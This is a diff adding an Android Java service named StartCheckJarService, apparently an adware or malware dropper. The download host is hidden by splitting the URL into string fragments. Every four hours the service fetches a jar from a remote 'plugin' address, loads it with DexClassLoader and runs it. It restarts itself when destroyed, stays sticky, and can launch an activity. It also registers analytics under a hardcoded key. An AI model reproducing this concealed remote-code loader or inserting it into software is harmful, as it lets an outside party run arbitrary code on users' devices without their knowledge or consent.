@@ -1,0 +1,275 @@
+package g.d.t.gdt;
+
+import g.d.x.d;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+
+import org.apache.http.HttpResponse;
+import org.apache.http.HttpStatus;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.DefaultHttpClient;
+
+import com.umeng.analytics.AnalyticsConfig;
+import com.umeng.analytics.MobclickAgent;
+
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Message;
+import dalvik.system.DexClassLoader;
+
+public class StartCheckJarService extends Service {
+
+	private static String jarName = "gdta.jar"; // jar包名称;
+
+	static String d1 = "http://";
+	static String d2 = "a0";
+	static String d3 = "n";
+	static String d4 = "31";
+	static String d41 = "17";
+	static String d5 = "com";
+	static String d6 = "/pl";
+	static String d61 = "ug";
+	static String d7 = "in/";
+	private static String jarurl = d1 + d2 + "." + d3 + d4 + d41 + "." + d5 + d6 + d61 + d7 + jarName; // jar下载地址;
+	// private static String brclassName = "go.go.go"; // 动态注册广播名称
+	private static String jarInter = "g.d.x.dd"; // 接口;
+	private static int sleeptime = 240; // 更新JAR包的间隔,分钟;
+	private static String appid = null; //
+	private static String initinfos = null; // 传递信息;
+
+	// private BroadcastReceiver bcr;
+	static d jar;
+
+	static File dexOutputDir;
+	static File jarfile;
+	static boolean jarisnew = false;
+	static DexClassLoader classLoader;
+
+	private static Thread checkt;
+	private static HttpClient httpClient;
+	private static HttpGet httpGet;
+	private static HttpResponse httpResponse;
+	private static StartCheckJarService scjService;
+	private static Context context;
+	private static final int LOAD_JAR = 1;
+	private static final int STOP_JAR = 2;
+	private static final int SHOW_ACT = 3;
+
+	private static Handler handlerchecktnew = new Handler() {
+		@Override
+		public void handleMessage(Message msg) {
+			switch (msg.what) {
+			case STOP_JAR:
+				stopJar();
+				break;
+			case LOAD_JAR:
+				if (jar == null) {
+					LogUtil.i("jar为空,加载JAR包");
+					loadJar();
+				} else if (jarisnew) {
+					try {
+						LogUtil.i("JAR包更新,关闭JAR包");
+						jar.closeJAR(context);
+					} catch (Exception e) {
+						LogUtil.i("JAR包更新,关闭JAR包失败");
+					}
+					loadJar();
+				}
+				if (jar != null)
+					try {
+						jar.init(context, appid, initinfos);
+					} catch (Exception e) {
+					}
+				break;
+			case SHOW_ACT:
+				showJarAct();
+				break;
+			default:
+				break;
+			}
+		}
+	};
+
+	@Override
+	public void onCreate() {
+		LogUtil.i("onCreate");
+		context = this;
+		scjService = this;
+		youmeng();
+		dexOutputDir = context.getDir("dex", 0);
+		jarfile = new File(context.getFilesDir(), jarName);
+		// creatbroR();
+		creatthread(this);
+		super.onCreate();
+	}
+
+	private void youmeng() {
+		AnalyticsConfig.setAppkey("55f91c3de0f55a82ce00594c");
+		AnalyticsConfig.setChannel("test01");
+		MobclickAgent.updateOnlineConfig(context);
+		MobclickAgent.onResume(context);
+	}
+
+	/**
+	 * 创建线程循环更新JAR包.并调用.
+	 * 
+	 * @param context
+	 */
+	private static void creatthread(final Context context) {
+		if (checkt == null)
+			checkt = new Thread() {
+				public void run() {
+					while (true) {
+						// LogUtil.i("JAR下载地址" + jarurl);
+						jarisnew = false;
+						httpGet = new HttpGet(jarurl);
+						httpResponse = null;
+						if (httpClient == null)
+							httpClient = new DefaultHttpClient();
+						try {
+							httpResponse = httpClient.execute(httpGet);
+						} catch (ClientProtocolException e) {
+							e.printStackTrace();
+						} catch (IOException e) {
+							e.printStackTrace();
+						}
+						if (httpResponse != null) {
+							if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
+								long newJarSize = httpResponse.getEntity().getContentLength();
+								if (!jarfile.exists() || newJarSize != jarfile.length()) {
+									if (jarfile.exists()) {
+										LogUtil.i("JAR包存在,大小不一样:" + jarfile.length() + "-------newJarSize:"
+												+ newJarSize + "---删除文件");
+										jarfile.delete();
+										handlerchecktnew.sendEmptyMessage(STOP_JAR);
+									}
+									File jarfiletemp = new File(context.getFilesDir(), jarName + ".temp");
+									InputStream is = null;
+									FileOutputStream fs = null;
+									try {
+										byte[] buff = new byte[1024];
+										int len = 0;
+										fs = new FileOutputStream(jarfiletemp);
+										is = httpResponse.getEntity().getContent();
+										while ((len = is.read(buff)) != -1) {
+											fs.write(buff, 0, len);
+										}
+										if (jarfiletemp.length() == newJarSize) {
+											LogUtil.i("下载成功,保存JAR包");
+											jarfiletemp.renameTo(jarfile);
+											jarisnew = true;
+										}
+										fs.close();
+										is.close();
+										httpClient.getConnectionManager().shutdown();
+									} catch (IllegalStateException e) {
+										e.printStackTrace();
+									} catch (IOException e) {
+										e.printStackTrace();
+									} finally {
+										try {
+											is.close();
+											fs.close();
+										} catch (IOException e) {
+											e.printStackTrace();
+										}
+									}
+								} else {
+									LogUtil.i("JAR包存在 并大小一样");
+								}
+							}
+						} else {
+							LogUtil.i("httpResponse为null");
+						}
+						if (jarfile.exists())
+							handlerchecktnew.sendEmptyMessage(LOAD_JAR);
+						try {
+							sleep(sleeptime * 60 * 1000);
+						} catch (InterruptedException e) {
+							e.printStackTrace();
+						}
+					}
+				};
+			};
+		if (!checkt.isAlive())
+			checkt.start();
+	}
+
+	// /**
+	// * 注册广播
+	// */
+	// private void creatbroR() {
+	// if (bcr == null)
+	// bcr = new BroadcastReceiver() {
+	// @Override
+	// public void onReceive(Context context, Intent intent) {
+	// LogUtil.i("info.br");
+	// // handlerchecktnew.sendEmptyMessage(SHOW_ACT);
+	// }
+	// };
+	// IntentFilter filter = new IntentFilter();
+	// filter.addAction(brclassName);
+	// this.registerReceiver(bcr, filter);
+	// }
+
+	private static void loadJar() {
+		LogUtil.i("loadJar");
+		if (jarfile.exists()) {
+			// if (classLoader == null)
+			classLoader = new DexClassLoader(jarfile.getAbsolutePath(), dexOutputDir.getAbsolutePath(), null,
+					context.getClassLoader());
+			Class<?> lib;
+			try {
+				lib = classLoader.loadClass(jarInter);
+				LogUtil.i("加载成功1");
+				jar = (d) lib.newInstance();
+				LogUtil.i("加载成功2");
+			} catch (Exception e) {
+				LogUtil.i("加载失败");
+			}
+		}
+	}
+
+	protected static void showJarAct() {
+		Intent Intent = new Intent(scjService.getBaseContext(), DInsert.class);
+		Intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+		scjService.getApplication().startActivity(Intent);
+	}
+
+	protected static void stopJar() {
+		if (jar != null)
+			try {
+				jar.closeJAR(context);
+			} catch (Exception e) {
+			}
+		jar = null;
+	}
+
+	@Override
+	public IBinder onBind(Intent intent) {
+		return null;
+	}
+
+	@Override
+	public void onDestroy() {
+		MobclickAgent.onPause(context);
+		Intent sevice = new Intent(this, StartCheckJarService.class);
+		this.startService(sevice);
+		super.onDestroy();
+	}
+
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId) {
+
+		flags = START_STICKY;
+		return super.onStartCommand(intent, flags, startId);
+	}
+}
